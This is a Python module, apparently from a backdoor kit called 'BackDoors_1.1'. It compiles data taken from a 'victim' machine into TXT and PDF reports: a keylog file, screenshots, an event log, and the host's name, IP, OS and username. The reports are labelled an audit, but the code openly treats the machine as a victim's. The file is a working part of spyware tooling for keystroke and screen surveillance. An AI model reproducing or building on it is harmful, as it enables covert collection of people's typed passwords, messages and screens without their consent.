# server/export_report.py

import os
import datetime
import platform
import socket
from fpdf import FPDF
from PIL import Image

REPORTS_DIR = os.path.join(os.path.expanduser("~"), "BackDoors_1.1_Reports")
os.makedirs(REPORTS_DIR, exist_ok=True)

def collect_report_data(logs_path="~/.bd_logs"):
    logs_path = os.path.expanduser(logs_path)
    logs = []
    log_path = os.path.join(logs_path, "backdoors.log")
    if os.path.exists(log_path):
        with open(log_path, "r", encoding="utf-8") as f:
            logs = [line.strip() for line in f.readlines()]
    keylog = ""
    keylog_path = os.path.join(logs_path, "keylog.txt")
    if os.path.exists(keylog_path):
        with open(keylog_path, "r", encoding="utf-8") as f:
            keylog = f.read()
    screenshots = []
    if os.path.exists(logs_path):
        for fimg in os.listdir(logs_path):
            if fimg.lower().endswith(".png"):
                screenshots.append(os.path.join(logs_path, fimg))
    victim_info = {
        "hostname": platform.node(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "sistema": f"{platform.system()} {platform.release()}",
        "user": os.getenv("USERNAME") or os.getenv("USER"),
        "fecha": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    return victim_info, logs, keylog, screenshots

def export_txt(victim_info, logs, keylog, screenshots):
    fecha = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = os.path.join(REPORTS_DIR, f"Reporte_{victim_info['hostname']}_{fecha}.txt")
    with open(fname, "w", encoding="utf-8") as f:
        f.write(f"REPORTE DE AUDITORÍA - BackDoors_1.1\n")
        f.write(f"Fecha: {fecha}\n\n")
        f.write(f"=== INFO DEL SISTEMA ===\n")
        for k, v in victim_info.items():
            f.write(f"{k}: {v}\n")
        f.write("\n=== LOG DE EVENTOS ===\n")
        for line in logs:
            f.write(line + "\n")
        f.write("\n=== KEYLOG ===\n")
        f.write(keylog + "\n")
        f.write("\n=== SCREENSHOTS GUARDADOS ===\n")
        for img in screenshots:
            f.write(img + "\n")
    return fname

def export_pdf(victim_info, logs, keylog, screenshots):
    fecha = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = os.path.join(REPORTS_DIR, f"Reporte_{victim_info['hostname']}_{fecha}.pdf")
    pdf = FPDF()
    pdf.set_auto_page_break(auto=True, margin=15)
    pdf.add_page()
    pdf.set_font("Arial", "B", 14)
    pdf.cell(0, 10, "REPORTE DE AUDITORÍA - BackDoors_1.1", ln=1)
    pdf.set_font("Arial", "", 10)
    pdf.cell(0, 10, f"Fecha: {fecha}", ln=1)
    pdf.cell(0, 10, "", ln=1)
    pdf.set_font("Arial", "B", 12)
    pdf.cell(0, 10, "INFO DEL SISTEMA", ln=1)
    pdf.set_font("Arial", "", 10)
    for k, v in victim_info.items():
        pdf.cell(0, 8, f"{k}: {v}", ln=1)
    pdf.cell(0, 8, "", ln=1)
    pdf.set_font("Arial", "B", 12)
    pdf.cell(0, 8, "LOG DE EVENTOS", ln=1)
    pdf.set_font("Arial", "", 8)
    for line in logs:
        pdf.cell(0, 6, line, ln=1)
    pdf.cell(0, 8, "", ln=1)
    pdf.set_font("Arial", "B", 12)
    pdf.cell(0, 8, "KEYLOG", ln=1)
    pdf.set_font("Arial", "", 8)
    pdf.multi_cell(0, 6, keylog)
    pdf.cell(0, 8, "", ln=1)
    pdf.set_font("Arial", "B", 12)
    pdf.cell(0, 8, "SCREENSHOTS GUARDADOS", ln=1)
    pdf.set_font("Arial", "", 8)
    for img in screenshots:
        try:
            im = Image.open(img)
            w, h = im.size
            max_w = 90
            if w > max_w:
                h = int(h * max_w / w)
                w = max_w
            y = pdf.get_y()
            if y > 240:  # Nueva página si queda poco espacio
                pdf.add_page()
            pdf.cell(0, 6, os.path.basename(img), ln=1)
            pdf.image(img, x=None, y=None, w=w, h=h)
        except Exception as e:
            pdf.cell(0, 6, f"Error mostrando imagen: {e}", ln=1)
    pdf.output(fname)
    return fname

# Uso independiente (opcional):
if __name__ == "__main__":
    victim_info, logs, keylog, screenshots = collect_report_data()
    fname_txt = export_txt(victim_info, logs, keylog, screenshots)
    fname_pdf = export_pdf(victim_info, logs, keylog, screenshots)
    print(f"Reporte generado (TXT): {fname_txt}")
    print(f"Reporte generado (PDF): {fname_pdf}")

